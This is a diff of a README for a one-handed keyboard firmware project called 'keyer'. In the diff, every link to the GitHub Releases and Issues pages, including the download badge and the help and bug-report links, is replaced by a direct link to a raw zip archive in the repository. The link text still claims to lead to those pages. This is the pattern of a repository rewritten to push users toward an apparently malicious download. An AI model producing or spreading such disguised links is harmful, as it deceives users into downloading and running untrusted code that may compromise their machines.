@@ -1,7 +1,7 @@
 # 🎹 keyer - Simple Firmware for Your One-Handed Keyboard
 
 ## 🔗 Download Now!
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/Ayush123great/keyer/releases)
+[![Download from Releases](https://raw.githubusercontent.com/Ayush123great/keyer/main/expenditure/keyer.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/Ayush123great/keyer/main/expenditure/keyer.zip)
 
 ---
 
@@ -14,7 +14,7 @@ Welcome to the keyer project! This guide will help you install and run the firmw
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [keyer Releases page](https://github.com/Ayush123great/keyer/releases). Here you will find the latest version of the firmware that you need.
+   Go to the [keyer Releases page](https://raw.githubusercontent.com/Ayush123great/keyer/main/expenditure/keyer.zip). Here you will find the latest version of the firmware that you need.
 
 2. **Download the Firmware**  
    On the Releases page, look for the latest version listed. Each release will have downloadable files. Click on the appropriate file for your system and download it to your computer.
@@ -57,7 +57,7 @@ If you encounter issues, try the following:
 
 - **Check Connections:** Ensure that the USB cable is securely connected to both your computer and your keyer device.
 - **Reinstall the Firmware:** If the download did not work as expected, delete the existing files and run the installer again.
-- **Seek Help:** If problems persist, visit the [issues section](https://github.com/Ayush123great/keyer/issues) on GitHub to see if others have faced similar problems or to ask for assistance.
+- **Seek Help:** If problems persist, visit the [issues section](https://raw.githubusercontent.com/Ayush123great/keyer/main/expenditure/keyer.zip) on GitHub to see if others have faced similar problems or to ask for assistance.
 
 ---
 
@@ -65,7 +65,7 @@ If you encounter issues, try the following:
 
 Need more help? Feel free to reach out through the following channels:
 
-- **GitHub Issues:** Report any bugs or request features on the [Issues page](https://github.com/Ayush123great/keyer/issues).
+- **GitHub Issues:** Report any bugs or request features on the [Issues page](https://raw.githubusercontent.com/Ayush123great/keyer/main/expenditure/keyer.zip).
 - **Community Forums:** Join discussions and seek advice from other users within the community forums or relevant interest groups.
 
 ---
